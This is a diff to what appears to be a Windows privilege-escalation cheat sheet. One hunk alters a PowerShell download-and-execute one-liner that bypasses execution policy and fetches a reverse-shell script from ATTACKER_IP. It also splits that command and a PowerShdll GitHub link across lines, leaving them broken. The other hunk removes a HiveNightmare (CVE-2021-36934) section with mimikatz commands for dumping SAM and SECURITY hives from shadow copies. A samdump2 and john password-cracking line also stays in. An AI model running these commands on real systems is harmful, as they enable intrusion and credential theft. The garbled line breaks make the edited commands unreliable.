@@ -220,10 +220,14 @@ Powershell Constrained Mode
 $ExecutionContext.SessionState.LanguageMode
 
 PS > &{ whoami }
-powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/rev.ps1')"
+powershell.exe -v 2 -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/
+rev.ps
+1')"
 
 # PowerShDLL - Powershell with no Powershell.exe via DLL’s
-# https://github.com/p3nt4/PowerShdll
+# 
+https://github.com/
+p3nt4/PowerShdll
 ftp> rundll32.exe C:\temp\PowerShdll.dll,main
 ```
 
@@ -271,36 +275,6 @@ samdump2 SYSTEM SAM -o sam.txt
 ```
 
 Either crack it with `john -format=NT /root/sam.txt` or use Pass-The-Hash.
-
-
-### HiveNightmare
-
-> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user
-
-Check for the vulnerability using `icacls`
-
-```powershell
-C:\Windows\System32> icacls config\SAM
-config\SAM BUILTIN\Administrators:(I)(F)
-           NT AUTHORITY\SYSTEM:(I)(F)
-           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!
-```
-
-Then exploit the CVE by requesting the shadowcopies on the filesystem and reading the hives from it.
-
-```powershell
-mimikatz> token::whoami /full
-
-# List shadow copies available
-mimikatz> misc::shadowcopies
-
-# Extract account from SAM databases
-mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM
-
-# Extract secrets from SECURITY
-mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
-```
-
 
 ### Search for file contents
 
